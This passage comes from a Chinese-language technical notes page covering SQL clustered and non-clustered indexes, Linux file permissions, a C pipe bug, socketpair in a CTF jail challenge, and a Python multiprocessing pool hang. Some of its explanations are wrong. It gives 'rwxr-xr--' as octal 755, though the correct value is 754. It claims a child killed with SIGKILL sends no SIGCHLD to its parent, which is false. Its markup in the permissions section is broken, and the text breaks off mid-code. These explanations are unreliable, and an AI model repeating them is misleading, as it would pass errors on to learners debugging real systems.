OrderID <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>    CustomerID <span class="token keyword">INT</span><span class="token punctuation">,</span>    OrderDate <span class="token keyword">DATE</span><span class="token punctuation">,</span>    TotalAmount <span class="token keyword">DECIMAL</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>OrderID</code> 是每个订单的唯一标识，<code>OrderDate</code> 是订单的日期，<code>CustomerID</code> 是客户的编号，<code>TotalAmount</code> 是订单的总金额。</p><h4 id="聚簇索引的情况"><a href="#聚簇索引的情况" class="headerlink" title="聚簇索引的情况"></a>聚簇索引的情况</h4><p>我们可以为 <code>OrderID</code> 字段创建一个 <strong>聚簇索引</strong>，因为每个订单都有唯一的 <code>OrderID</code>，并且可以根据这个字段经常进行查找。由于 <code>OrderID</code> 是主键，数据库系统一般会自动为主键创建一个聚簇索引：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> Orders <span class="token keyword">ADD</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>OrderID<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><strong>物理存储</strong>：创建了聚簇索引后，<code>Orders</code> 表中的数据将按照 <code>OrderID</code> 的顺序在磁盘上物理存储。如果你查看硬盘上的数据文件，你会看到订单数据是按照 <code>OrderID</code> 排序存储的。</p></li><li><p><strong>查询效率</strong>：当你使用 <code>OrderID</code> 进行查询时，比如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Orders <span class="token keyword">WHERE</span> OrderID <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 <code>OrderID</code> 是聚簇索引，数据库可以直接通过索引找到相应的数据行，不需要额外步骤。数据行就是索引的叶子节点，查询速度非常快。</p></li><li><p><strong>缺点</strong>：如果你频繁按 <code>OrderID</code> 顺序插入新订单，数据库需要不断地重新排列存储数据，可能会影响插入性能。</p></li></ul><h4 id="非聚簇索引的情况"><a href="#非聚簇索引的情况" class="headerlink" title="非聚簇索引的情况"></a>非聚簇索引的情况</h4><p>现在你发现你经常需要按 <code>OrderDate</code> 查询订单，比如按日期范围查询过去某一天的订单。因此你为 <code>OrderDate</code> 创建了一个 <strong>非聚簇索引</strong>：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> idx_order_date <span class="token keyword">ON</span> Orders <span class="token punctuation">(</span>OrderDate<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><strong>物理存储</strong>：在创建非聚簇索引后，数据库并不会改变数据的物理存储顺序（它依然按 <code>OrderID</code> 存储）。但是，数据库会为 <code>OrderDate</code> 创建一个额外的索引结构。这个索引结构中包含 <code>OrderDate</code> 和 <code>OrderID</code>（指向数据行的地址），并且是按 <code>OrderDate</code> 排序的。</p></li><li><p><strong>查询效率</strong>：当你使用 <code>OrderDate</code> 进行查询时，比如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Orders <span class="token keyword">WHERE</span> OrderDate <span class="token operator">=</span> <span class="token string">'2024-10-03'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库会先在 <code>OrderDate</code> 的非聚簇索引中查找符合条件的 <code>OrderDate</code> 值，然后通过 <code>OrderID</code> 指针找到实际的数据行。这种查找过程会涉及两步：先通过索引找到指针，再通过指针找到数据行，这就是“回表”的过程。</p></li><li><p><strong>缺点</strong>：相比聚簇索引，非聚簇索引的查询性能稍差，因为它需要回表操作。</p></li><li></li></ul><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><h2 id="Linux系统使用"><a href="#Linux系统使用" class="headerlink" title="Linux系统使用"></a>Linux系统使用</h2><h3 id="1-文件权限"><a href="#1-文件权限" class="headerlink" title="1. 文件权限"></a>1. 文件权限</h3><p>在 Linux 和类 Unix 操作系统中，每个文件和目录都有一组权限，用来控制谁可以读取、写入或执行该文件或目录。这些权限可以帮助系统管理员确保只有授权的用户能够访问或修改系统中的文件和目录。</p><h4 id="文件权限的基本概念"><a href="#文件权限的基本概念" class="headerlink" title="文件权限的基本概念"></a>文件权限的基本概念</h4><p>文件权限分为三种类型，分别对应三类用户：</p><ol><li><strong>用户（User / Owner）</strong>: 文件的所有者。</li><li><strong>组（Group）</strong>: 拥有访问权限的用户组，文件所有者可以指定文件所属的用户组。</li><li><strong>其他用户（Others）</strong>: 既不属于文件所有者，也不属于文件所属的组的所有其他用户。</li></ol><h4 id="权限类型"><a href="#权限类型" class="headerlink" title="权限类型"></a>权限类型</h4><p>对于每种用户类型，有三种基本权限：</p><ol><li><strong>读取（Read, <code>r</code>）</strong>: 允许查看文件内容或列出目录内容。</li><li><strong>写入（Write, <code>w</code>）</strong>: 允许修改文件内容或在目录中创建、删除文件。</li><li><strong>执行（Execute, <code>x</code>）</strong>: 允许执行文件（如果是可执行程序或脚本），或者进入目录。</li></ol><h4 id="权限表示法"><a href="#权限表示法" class="headerlink" title="权限表示法"></a>权限表示法</h4><p>权限可以通过两种方式表示：符号表示法和八进制表示法。</p><h5 id="1-符号表示法"><a href="#1-符号表示法" class="headerlink" title="1. 符号表示法"></a>1. 符号表示法</h5><p>权限通常用 <code>r</code>, <code>w</code>, <code>x</code> 来表示，例如：</p><ul><li>```<br>rwxr-xr–<pre class="line-numbers language-none"><code class="language-none">  - &#96;rwx&#96;: 用户（Owner）拥有读取、写入和执行权限。  - &#96;r-x&#96;: 组（Group）拥有读取和执行权限。  - &#96;r--&#96;: 其他用户（Others）只有读取权限。这个表示法分为三组，每组三个字符，分别对应用户、组和其他用户的权限。##### 2. 八进制表示法权限也可以用一个三位的八进制数来表示，其中每位代表一组权限：- &#96;4&#96; 代表 &#96;r&#96; (读取权限)- &#96;2&#96; 代表 &#96;w&#96; (写入权限)- &#96;1&#96; 代表 &#96;x&#96; (执行权限)例如，&#96;rwxr-xr--&#96; 可以用八进制表示为 &#96;755&#96;：- 用户（Owner）：&#96;rwx&#96; &#x3D; 4 + 2 + 1 &#x3D; 7- 组（Group）：&#96;r-x&#96; &#x3D; 4 + 0 + 1 &#x3D; 5- 其他用户（Others）：&#96;r--&#96; &#x3D; 4 + 0 + 0 &#x3D; 4所以 &#96;rwxr-xr--&#96; 对应的八进制权限是 &#96;755&#96;。**查找某个目录下没有执行权限的js文件**&#96;&#96;&#96;bashfind &#x2F;path&#x2F;to&#x2F;directory -name &quot;*.js&quot; ! -perm &#x2F;u&#x3D;x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="2-限制某个用户使用cpu的时长"><a href="#2-限制某个用户使用cpu的时长" class="headerlink" title="2. 限制某个用户使用cpu的时长"></a>2. 限制某个用户使用cpu的时长</h3><p><code> ulimit -t 3600</code></p><h3 id="3-显示test-c中包含main的行"><a href="#3-显示test-c中包含main的行" class="headerlink" title="3. 显示test.c中包含main的行"></a>3. 显示test.c中包含main的行</h3><p><code>grep &#39;main&#39; test.c</code></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><h4 id="1-pipe管道"><a href="#1-pipe管道" class="headerlink" title="1. pipe管道"></a>1. pipe管道</h4><p><code>buf[n] = &quot;\0&quot;; </code>这里要注意，你写入 <code>buf[n]</code>的数据是一个指向 <code>&quot;\0&quot;</code>的指针。而不是你想要的 <code>\0</code>，所以在标准输入台输出的时候，会显示乱码。需要换成 <code>buf[n] = &#39;\0&#39;</code>这样才能算作是字符串的结束标志。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> pipe_fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"pipe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//子进程</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//close write of pipe_fd</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            buf<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\0"</span><span class="token punctuation">;</span> <span class="token comment">// 这里要注意</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"subprocess read data:%s\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// close read of pipe_fd</span>        <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> msg <span class="token operator">=</span> <span class="token string">"Hello from parent process!"</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-socketpair"><a href="#2-socketpair" class="headerlink" title="2. socketpair"></a>2. socketpair</h4><p><code>socketpair</code> 是一种用于在两个进程（例如父进程和子进程）之间创建<strong>双向通信通道</strong>的技术。它创建了一对相互连接的套接字（socket），使得两个进程可以通过文件描述符来进行数据读写，类似于管道（pipe），但 <code>socketpair</code> 提供了<strong>全双工</strong>的通信，即两个进程可以同时读写，而不仅仅是单向的。</p><h5 id="socketpair-的技术要点："><a href="#socketpair-的技术要点：" class="headerlink" title="socketpair 的技术要点："></a><code>socketpair</code> 的技术要点：</h5><ul><li><strong>通信协议</strong>：<code>socketpair</code> 使用 UNIX 域套接字 (<code>AF_UNIX</code>) 进行本地进程间通信。这种通信机制适用于同一台机器上的进程间通信，而不是基于网络的进程通信。</li><li><strong>双向通信</strong>：<code>socketpair</code> 与 <code>pipe</code> 不同，管道通常是单向的，而 <code>socketpair</code> 是双向的。每个文件描述符都可以读写数据，两个进程之间能够相互通信。</li><li><strong>阻塞与非阻塞</strong>：<code>socketpair</code> 可以工作在阻塞或非阻塞模式下。默认情况下，它是阻塞的，也就是说，如果某一端没有准备好读取数据，写入数据的进程可能会被阻塞。</li></ul><h5 id="socketpair-的函数签名："><a href="#socketpair-的函数签名：" class="headerlink" title="socketpair 的函数签名："></a><code>socketpair</code> 的函数签名：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">socketpair</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">,</span> <span class="token keyword">int</span> sv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>domain</code>: 通信域，通常使用 <code>AF_UNIX</code>，即 UNIX 域套接字，用于本地进程间通信。</li><li><code>type</code>: 套接字类型，常见的有 <code>SOCK_STREAM</code>（流式套接字）和 <code>SOCK_DGRAM</code>（数据报套接字）。流式套接字提供面向连接的字节流通信，类似于 TCP。</li><li><code>protocol</code>: 通常设置为 0，表示使用默认协议。</li><li><code>sv[2]</code>: 一个数组，用来存放返回的两个文件描述符，<code>sv[0]</code> 和 <code>sv[1]</code> 分别代表父进程和子进程的套接字。</li></ul><h5 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> file_descriptors<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> file_descriptors<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> parent_socket <span class="token operator">=</span> file_descriptors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> child_socket <span class="token operator">=</span> file_descriptors<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码的作用是创建一对连接的套接字，通过 <code>socketpair(AF_UNIX, SOCK_STREAM, 0, file_descriptors)</code> 来生成两个文件描述符，分别用于父进程和子进程的通信。</p><ul><li><code>file_descriptors[0]</code> 是父进程使用的套接字文件描述符。</li><li><code>file_descriptors[1]</code> 是子进程使用的套接字文件描述符。</li></ul><p>接下来，父进程和子进程可以通过 <code>parent_socket</code> 和 <code>child_socket</code> 进行数据的交换。<strong>数据写入父进程的文件描述符后，子进程可以通过它的文件描述符读取该数据，反之亦然。</strong></p><h5 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h5><p>在你提供的代码中，<code>socketpair</code> 用于在父进程和子进程（进入“监狱”的进程）之间通信。子进程无法直接访问系统资源（如文件系统或网络），因此它必须依赖父进程来获取数据或进行操作。在这种情况下，<code>socketpair</code> 是非常适合的技术，因为它提供了一条安全的通信通道。</p><pre class="line-numbers language-none"><code class="language-none">c复制代码puts(&quot;Creating a &#96;socketpair&#96; that the child and parent will use to communicate. This is a pair of file descriptors that are&quot;);puts(&quot;connected: data written to one can be read from the other, and vice-versa.\n&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这说明了 <code>socketpair</code> 的核心功能：数据可以在父子进程之间双向传递。子进程受限于 “jail” 环境，只有通过这种套接字与父进程通信，可能需要从父进程获取关键信息（如 flag）。</p><h5 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h5><ol><li><strong>创建进程</strong>：父进程首先通过 <code>fork()</code> 创建子进程。父进程保留一个文件描述符，子进程保留另一个。</li><li><strong>双向通信</strong>：父进程和子进程可以通过套接字互相发送和接收数据。任何写入 <code>parent_socket</code> 的数据可以被 <code>child_socket</code> 读取，反之亦然。</li><li><strong>监狱环境</strong>：子进程被限制在 “jail” 中，它无法直接访问外部资源，依赖父进程通过 <code>socketpair</code> 提供服务。挑战中提到的 “convince the parent process to give it to you”（让父进程提供 flag），意味着子进程必须通过精心构建的通信来请求父进程，才能拿到 flag。</li></ol><h5 id="socketpair-的优势："><a href="#socketpair-的优势：" class="headerlink" title="socketpair 的优势："></a><code>socketpair</code> 的优势：</h5><ul><li><strong>本地进程间通信的高效性</strong>：<code>socketpair</code> 不需要经过网络堆栈，适合高效的本地进程间通信。</li><li><strong>双向通信</strong>：可以实现数据的双向传输，方便父子进程或任意两个进程之间的交互。</li><li><strong>隔离和安全</strong>：父进程和子进程通过套接字隔离，它们只能通过套接字通信，子进程在受限的 jail 环境下不会直接访问系统资源。</li></ul><h5 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h5><p><code>socketpair</code> 是一种强大且简洁的进程间通信机制，适用于本地的父子进程间的双向通信。在你提供的例子中，父子进程通过 <code>socketpair</code> 进行信息传递，子进程在受限环境下试图从父进程获取 <code>flag</code>，是一个经典的 CTF 场景。</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h4 id="2-python多线程"><a href="#2-python多线程" class="headerlink" title="2. python多线程"></a>2. python多线程</h4><p><strong>问题描述</strong>：同学遇到了一个问题，即在开启多线程处理数据时，并使用 <code>tqdm.tqdm(p.imap_unordered(worker, t_args), total=len(t_args))</code>进行统计时，总是会在最后卡住。</p><p><strong>原始代码</strong>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token keyword">import</span> tqdm<span class="token keyword">import</span> signal<span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    singer <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    song <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> singer<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> singer<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGKILL<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'running ,'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>singer<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">' pid: '</span><span class="token punctuation">,</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t_args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span>processes<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> maxtasksperchild<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span>p<span class="token punctuation">.</span>imap_unordered<span class="token punctuation">(</span>sing<span class="token punctuation">,</span> t_args<span class="token punctuation">)</span><span class="token punctuation">,</span> total<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>t_args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token comment"># p.imap_unordered(sing, t_args)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里无论是否使用tqdm统计p.imap_unorder的完成，都会卡住。</p><p><strong>原因分析</strong></p><p>在sing函数中使用 <code>os.kill(os.getpid(), signal.SIGKILL)</code>结束子进程时，子进程直接结束了。父进程的进程池无法收到子进程结束的状态，所以他会一直等待子进程返回状态，但是子进程已经结束了。进程池需要通过 <code>SIGCHLD</code> 信号了解子进程的终止状态。如果子进程被强制终止（如 <code>SIGKILL</code> 信号–），进程池不会收到 <code>SIGCHLD</code> 信号，因此会一直等待子进程完成。</p><p>当进程正常退出时，当一个进程正常退出时（例如，通过 <code>exit()</code> 或 <code>return</code>），它会向其父进程发送 <code>SIGCHLD</code> 信号。父进程（在这种情况下是进程池）会捕获到这个信号，并更新其内部状态以反映子进程已经终止。而 <code>SIGKILL</code> 是一个无法被捕获或忽略的信号。它会立即终止进程而不进行任何清理工作，也不会向父进程发送终止通知。因此，进程池无法知道子进程已经终止，可能会导致资源泄漏或进程池状态不一致。</p><p>所以我们需要在子进程中加入异常信号处理函数，在子进程接受到信号量以后，发送相应的信号量到父进程。</p><p><strong>正常版本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token keyword">import</span> tqdm<span class="token keyword">import</span> signal<span class="token comment"># 进程使用以及传参</span><span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    singer <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    song <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> singer<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> singer<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' pid: '</span><span class="token punctuation">,</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGTERM<span class="token punctuation">)</span>    <span class="token comment"># print('running ,',str(singer),' pid: ',os.getpid(),'pgid: ', os.getpgid(os.getpid()))</span>    <span class="token comment"># print('running ,',str(singer),' pid: ',os.getpid())</span>    <span class="token comment"># print('sing:',os.getppid(), multiprocessing.current_process().name)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>singer<span class="token punctuation">&#125;</span></span><span class="token string">唱</span><span class="token interpolation"><span class="token punctuation">&#123;</span>song<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handle_signal</span><span class="token punctuation">(</span>signum<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Process </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> received signal </span><span class="token interpolation"><span class="token punctuation">&#123;</span>signum<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">raise</span> SystemExit<span class="token punctuation">(</span><span class="token string">'Terminated'</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    signal<span class="token punctuation">.</span>signal<span class="token punctuation">(</span>signal<span class="token punctuation">.</span>SIGTERM<span class="token punctuation">,</span> handle_signal<span class="token punctuation">)</span> <span class="token comment"># 创建信号处理函数，这样通过os向子进程发送信号以后，子进程可以向父进程发送信号。</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sing<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Unexpected error in process </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>      <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t_args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> multiprocessing<span class="token 